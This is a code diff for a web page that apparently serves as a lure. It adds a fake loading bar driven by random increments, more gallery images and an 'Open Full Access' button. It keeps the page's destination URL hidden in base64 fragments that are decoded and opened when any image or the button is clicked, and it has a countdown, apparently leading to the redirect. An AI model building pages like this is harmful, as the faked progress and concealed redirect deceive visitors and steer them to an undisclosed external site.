@@ -16,7 +16,7 @@
 body{
   margin:0;
   font-family:Arial;
-  background:#0f0f0f;
+  background:#0b1220;
   color:white;
 }
 
@@ -25,7 +25,7 @@ body{
   position:fixed;
   width:100%;
   height:100%;
-  background:#0f0f0f;
+  background:linear-gradient(135deg,#0b1220,#1e3a8a);
   display:flex;
   justify-content:center;
   align-items:center;
@@ -33,17 +33,30 @@ body{
   z-index:999;
 }
 
-.loader{
-  width:45px;
-  height:45px;
-  border:5px solid #333;
-  border-top:5px solid #00ffcc;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
+.logo{
+  font-size:32px;
+  margin-bottom:25px;
 }
 
-@keyframes spin{
-  100%{transform:rotate(360deg);}
+.progress-box{
+  width:260px;
+  height:6px;
+  background:rgba(255,255,255,0.2);
+  border-radius:10px;
+  overflow:hidden;
+}
+
+.progress-bar{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg,#3b82f6,#60a5fa);
+  transition:width 0.3s;
+}
+
+.progress-text{
+  margin-top:10px;
+  font-size:14px;
+  opacity:0.8;
 }
 
 /* ENTER */
@@ -71,7 +84,7 @@ body{
 
 .gallery img{
   width:100%;
-  border-radius:8px;
+  border-radius:10px;
   cursor:pointer;
   transition:0.2s;
 }
@@ -80,12 +93,14 @@ body{
   transform:scale(1.05);
 }
 
+/* BUTTON */
 button{
   margin-top:20px;
-  padding:12px 20px;
-  background:#00ffcc;
+  padding:12px 22px;
+  background:linear-gradient(135deg,#2563eb,#3b82f6);
   border:none;
-  border-radius:8px;
+  border-radius:10px;
+  color:white;
   font-weight:bold;
   cursor:pointer;
 }
@@ -102,8 +117,13 @@ button{
 
 <!-- LOADING -->
 <div id="loading">
-  <div class="loader"></div>
-  <p style="opacity:0.6;">Loading content...</p>
+  <div class="logo">🔵 Loading</div>
+
+  <div class="progress-box">
+    <div class="progress-bar" id="bar"></div>
+  </div>
+
+  <div class="progress-text" id="txt">Loading... 0%</div>
 </div>
 
 <!-- ENTER -->
@@ -133,6 +153,9 @@ button{
     <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="goLink()">
     <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="goLink()">
     <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="goLink()">
+    <img src="https://i.imgur.com/AOM9fTf.jpeg" onclick="goLink()">
+    <img src="https://i.imgur.com/d9gZSs3.jpeg" onclick="goLink()">
+    <img src="https://i.imgur.com/AxmBfxf.jpeg" onclick="goLink()">
   </div>
 
   <button onclick="goLink()">Open Full Access</button>
@@ -145,32 +168,52 @@ button{
 
 <script>
 
-/* STEP 1: loading → enter */
-setTimeout(()=>{
-  document.getElementById("loading").style.display="none";
-  document.getElementById("enterScreen").style.display="flex";
+/* PROGRESS LOADING */
+let progress=0;
+const bar=document.getElementById("bar");
+const txt=document.getElementById("txt");
 
-  setTimeout(()=>{
-    enterPage();
-  },2000);
+function loadSim(){
+  progress += Math.random()*8;
 
-},1200);
+  if(progress>=100){
+    progress=100;
+    bar.style.width="100%";
+    txt.innerText="Loading... 100%";
 
-/* STEP 2: enter */
+    setTimeout(()=>{
+      document.getElementById("loading").style.display="none";
+      document.getElementById("enterScreen").style.display="flex";
+
+      setTimeout(()=>enterPage(),2000);
+
+    },500);
+
+    return;
+  }
+
+  bar.style.width=progress+"%";
+  txt.innerText="Loading... "+Math.floor(progress)+"%";
+
+  requestAnimationFrame(loadSim);
+}
+
+loadSim();
+
+/* ENTER */
 function enterPage(){
   document.getElementById("enterScreen").style.display="none";
   document.getElementById("galleryPage").style.display="block";
   startCountdown();
 }
 
-/* ENCODED LINK */
-const p1="aHR0cHM6Ly9mZGVk";
-const p2="ZGcuaHVic3Mub25l";
-const p3="L3AvbmhWTnk=";
+/* ENCODE LINK */
+const a="aHR0cHM6Ly9mZGVk";
+const b="ZGcuaHVic3Mub25l";
+const c="L3AvbmhWTnk=";
 
 function goLink(){
-  const url = atob(p1+p2+p3);
-  window.location.href = url;
+  location.href=atob(a+b+c);
 }
 
 /* COUNTDOWN */
@@ -180,7 +223,7 @@ function startCountdown(){
 
   const timer=setInterval(()=>{
     t--;
-    el.textContent=t;
+    el.innerText=t;
 
     if(t<=0){
       clearInterval(timer);
